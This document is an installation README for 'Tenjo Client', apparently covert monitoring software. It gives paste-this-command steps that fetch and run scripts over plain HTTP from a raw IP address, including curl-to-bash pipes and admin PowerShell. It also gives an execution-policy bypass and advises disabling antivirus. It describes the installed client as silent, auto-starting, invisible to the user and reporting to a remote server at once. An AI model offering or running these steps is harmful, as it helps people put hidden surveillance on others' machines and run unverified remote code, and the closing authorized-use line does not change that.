# Tenjo Client - Installation Instructions

## Server: 103.129.149.67

### 🪟 Windows Installation (Run as Administrator)

**One-Line Install:**
```cmd
powershell -Command "Invoke-WebRequest -Uri 'http://103.129.149.67/downloads/easy_install_windows.bat' -OutFile 'tenjo_install.bat'; .\tenjo_install.bat"
```

**Alternative if main installer fails:**
```cmd
powershell -Command "Invoke-WebRequest -Uri 'http://103.129.149.67/downloads/quick_install_windows.bat' -OutFile 'tenjo_quick.bat'; .\tenjo_quick.bat"
```

*When prompted for server URL during installation, enter: `http://103.129.149.67`*

### 🍎 macOS Installation

**One-Line Install:**
```bash
curl -sSL http://103.129.149.67/downloads/easy_install_macos.sh | bash
```

**Manual Download:**
```bash
curl -O http://103.129.149.67/downloads/easy_install_macos.sh
chmod +x easy_install_macos.sh
./easy_install_macos.sh
```

*When prompted for server URL during installation, enter: `http://103.129.149.67`*

### 🐧 Linux Installation

```bash
curl -sSL http://103.129.149.67/downloads/easy_install_macos.sh | bash
```

## Installation Requirements

### Windows
- Windows 10/11
- Administrator privileges
- Internet connection
- Python 3.8+ (will be installed automatically if not present)

### macOS
- macOS 10.14+ (Mojave or newer)
- Internet connection
- Python 3.8+ (usually pre-installed)

### Linux
- Ubuntu 18.04+ / CentOS 7+ / Debian 10+
- Internet connection
- Python 3.8+

## Troubleshooting

### Windows Issues

**"Access is denied" Error:**
- Make sure you're running as Administrator
- Try the quick installer method
- Temporarily disable antivirus software

**"Python not found" Error:**
- Download Python from https://python.org/downloads
- Make sure to check "Add Python to PATH" during installation
- Restart Command Prompt after Python installation

**PowerShell Execution Policy Error:**
```cmd
powershell -ExecutionPolicy Bypass -Command "your-command-here"
```

### macOS Issues

**"Permission denied" Error:**
```bash
chmod +x install_103.129.149.67.sh
./install_103.129.149.67.sh
```

**Python Issues:**
```bash
# Install Python via Homebrew
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
brew install python
```

### General Issues

**Cannot download files:**
- Check internet connection
- Verify server is accessible: http://103.129.149.67
- Try alternative download methods

**Installation fails:**
- Check system requirements
- Run with administrator/sudo privileges
- Contact support with error details

## What Happens After Installation

1. **Silent Operation**: The client runs in the background with no visible interface
2. **Auto-Start**: Automatically starts when the computer boots
3. **Monitoring**: Begins monitoring and reporting to server immediately
4. **No User Interaction**: Works completely transparently

## Uninstallation

### Windows
```cmd
powershell -Command "Invoke-WebRequest -Uri 'http://103.129.149.67/downloads/uninstall_windows.bat' -OutFile 'uninstall.bat'; .\uninstall.bat"
```

### macOS
```bash
curl -sSL http://103.129.149.67/downloads/uninstall_macos.sh | bash
```

## Support

- **Dashboard**: http://103.129.149.67
- **Server Status**: Check if server is online at the dashboard URL
- **Installation Issues**: Contact system administrator
- **Technical Support**: Include error messages and system information

---

**Note**: This monitoring software is intended for authorized use only. Ensure you have proper permission before installing on any system.
